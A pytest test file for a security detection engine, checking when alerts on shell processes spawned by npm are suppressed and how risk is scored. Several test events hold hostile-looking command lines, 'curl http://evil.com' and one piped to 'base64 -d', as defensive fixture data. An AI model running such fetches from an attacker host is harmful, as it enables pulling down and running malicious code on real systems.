import pytest
from app.detection.engine.rule_loader import RuleLoader
from app.detection.engine.rule_evaluator import RuleEvaluator
from app.detection.engine.risk_scoring import RiskScorer
from app.detection.engine.suppressions import SuppressionEngine
from app.detection.engine.normalization import enrich_process_fields
from app.detection.schemas.rule_schema import DetectionRule

@pytest.fixture
def components():
    loader = RuleLoader()
    all_rules = loader.load_rules_from_directory(loader.rules_path, include_disabled=True)
    rule = next((r for r in all_rules if r.id == "linux_t1059_shell_network_tool_sample"), None)
    
    evaluator = RuleEvaluator()
    scorer = RiskScorer(evaluator)
    engine = SuppressionEngine(evaluator=evaluator)
    
    return {
        "rule": rule,
        "evaluator": evaluator,
        "scorer": scorer,
        "engine": engine
    }

def test_benign_build_workflow_is_suppressed(components):
    # npm parent, sh process, no curl/wget/etc.
    event = enrich_process_fields({
        "process": {
            "name": "sh",
            "command_line": "ls -la",
            "parent": {"name": "npm"}
        },
        "user": {"name": "root"},
        "host": {"name": "test"}
    })
    rule = components["rule"]
    evaluator = components["evaluator"]
    scorer = components["scorer"]
    engine = components["engine"]
    
    match = evaluator.evaluate(event, rule)
    # The sample rule actually requires curl/wget to match. 
    # Let's use a dummy rule that matches anything for this test or use a rule that matches sh.
    # Actually, the sample rule matches sh/bash AND requires curl/wget.
    # So to test suppression, it MUST match the rule first.
    
    # Let's use a custom rule for easier testing of the engine logic.
    rule_data = {
        "id": "test_rule",
        "name": "Test Rule",
        "description": "test",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["process.name"],
        "condition": {"field": "process.name", "operator": "equals", "value": "sh"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    
    match = evaluator.evaluate(event, rule)
    assert match.matched is True
    
    risk = scorer.calculate(event, rule, match)
    supp = engine.should_suppress(event, rule, match, risk)
    
    assert supp.suppressed is True
    assert supp.suppression_id == "benign_build_workflow_low_risk"

def test_build_command_suppressed_when_parent_name_absent(components):
    # No parent.name (best-effort resolution missed), but the command is clearly
    # a build command — the normalized-command fallback keeps it suppressed.
    event = enrich_process_fields({
        "process": {
            "name": "sh",
            "command_line": "npm install --production",
        },
    })
    rule_data = {
        "id": "test_rule",
        "name": "Test Rule",
        "description": "test",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["process.name"],
        "condition": {"field": "process.name", "operator": "equals", "value": "sh"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    match = components["evaluator"].evaluate(event, rule)
    risk = components["scorer"].calculate(event, rule, match)
    supp = components["engine"].should_suppress(event, rule, match, risk)

    assert supp.suppressed is True
    assert supp.suppression_id == "benign_build_workflow_low_risk"


def test_build_workflow_with_curl_is_not_suppressed(components):
    event = enrich_process_fields({
        "process": {
            "name": "sh",
            "command_line": "curl http://evil.com",
            "parent": {"name": "npm"}
        },
        "user": {"name": "root"},
        "host": {"name": "test"}
    })
    # This matches 'benign_build_workflow_low_risk' parent BUT fails the 'not_contains_any' check for 'curl'.
    
    rule_data = {
        "id": "test_rule",
        "name": "Test Rule",
        "description": "test",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["process.name"],
        "condition": {"field": "process.name", "operator": "equals", "value": "sh"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    
    match = components["evaluator"].evaluate(event, rule)
    risk = components["scorer"].calculate(event, rule, match)
    supp = components["engine"].should_suppress(event, rule, match, risk)
    
    assert supp.suppressed is False

def test_high_severity_event_not_suppressed_by_default(components):
    # Medium rule + increase_if adjustment = High (67)
    rule = components["rule"] # T1059 sample
    event = {
        "process": {
            "name": "sh",
            "command_line": "curl http://evil.com | base64 -d",
            "parent": {"name": "npm"}
        },
        "user": {"name": "root"},
        "host": {"name": "test"}
    }
    # Rule id matches rule_exception 't1059_low_risk_build_parent_exception'
    # Parent matches 'npm'.
    # BUT command_line contains 'curl' and 'base64'.
    # base64 adds +20 risk -> 47+20=67 (High).
    
    match = components["evaluator"].evaluate(event, rule)
    risk = components["scorer"].calculate(event, rule, match)
    assert risk.final_severity == "high"
    
    supp = components["engine"].should_suppress(event, rule, match, risk)
    # Even if conditions matched (they don't because of curl), it wouldn't suppress High risk.
    assert supp.suppressed is False

def test_high_severity_event_can_be_suppressed_if_allowed(components):
    engine = components["engine"]
    # Manually add a suppression that allows high risk
    engine.global_suppressions.append({
        "id": "allow_high_risk_test",
        "enabled": True,
        "allow_high_risk": True,
        "conditions": {"field": "process.name", "operator": "equals", "value": "high_process"},
        "reason": "Test"
    })
    
    event = {"process": {"name": "high_process"}}
    rule_data = {
        "id": "test_rule",
        "name": "Test Rule",
        "description": "test",
        "severity": "critical",
        "risk_score": 100,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["process.name"],
        "condition": {"field": "process.name", "operator": "equals", "value": "high_process"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    match = components["evaluator"].evaluate(event, rule)
    risk = components["scorer"].calculate(event, rule, match)
    assert risk.final_severity == "critical"
    
    supp = engine.should_suppress(event, rule, match, risk)
    assert supp.suppressed is True

def test_rule_exception_applies_only_to_matching_rule_id(components):
    engine = components["engine"]
    # 't1059_low_risk_build_parent_exception' is for 'linux_t1059_shell_network_tool_sample'
    
    rule_data = {
        "id": "wrong_rule_id",
        "name": "Wrong ID",
        "description": "test",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["process.name"],
        "condition": {"field": "process.name", "operator": "equals", "value": "sh"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    event = enrich_process_fields({
        "process": {
            "name": "sh",
            "command_line": "ls",
            "parent": {"name": "npm"}
        }
    })

    match = components["evaluator"].evaluate(event, rule)
    risk = components["scorer"].calculate(event, rule, match)
    supp = engine.should_suppress(event, rule, match, risk)

    # It should still be suppressed by the GLOBAL suppression 'benign_build_workflow_low_risk'
    # which has the same conditions.
    assert supp.suppressed is True
    assert supp.suppression_id == "benign_build_workflow_low_risk"

def test_disabled_suppression_is_ignored(components):
    engine = components["engine"]
    for s in engine.global_suppressions:
        s["enabled"] = False
    for s in engine.linux_suppressions:
        s["enabled"] = False
    for s in engine.rule_exceptions:
        s["enabled"] = False
        
    event = {
        "process": {
            "name": "sh",
            "command_line": "ls",
            "parent": {"name": "npm"}
        }
    }
    rule_data = {
        "id": "test_rule",
        "name": "Test Rule",
        "description": "test",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["process.name"],
        "condition": {"field": "process.name", "operator": "equals", "value": "sh"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    match = components["evaluator"].evaluate(event, rule)
    risk = components["scorer"].calculate(event, rule, match)
    supp = engine.should_suppress(event, rule, match, risk)
    
    assert supp.suppressed is False

def test_malformed_suppression_records_error(components):
    engine = components["engine"]
    engine.global_suppressions.append({
        "id": "malformed",
        "enabled": True,
        "conditions": "not a dict" # Malformed
    })
    
    event = {"process": {"name": "sh"}}
    rule_data = {
        "id": "test_rule",
        "name": "Test Rule",
        "description": "test",
        "severity": "medium",
        "risk_score": 50,
        "mitre": {"tactic": "test"},
        "log_source": {"product": "test"},
        "required_fields": ["process.name"],
        "condition": {"field": "process.name", "operator": "equals", "value": "sh"},
        "investigation_guide": "test"
    }
    rule = DetectionRule(**rule_data)
    match = components["evaluator"].evaluate(event, rule)
    risk = components["scorer"].calculate(event, rule, match)
    
    supp = engine.should_suppress(event, rule, match, risk)
    # The malformed one should fail and be recorded in errors
    assert any("Error in global_suppression" in e for e in supp.errors)
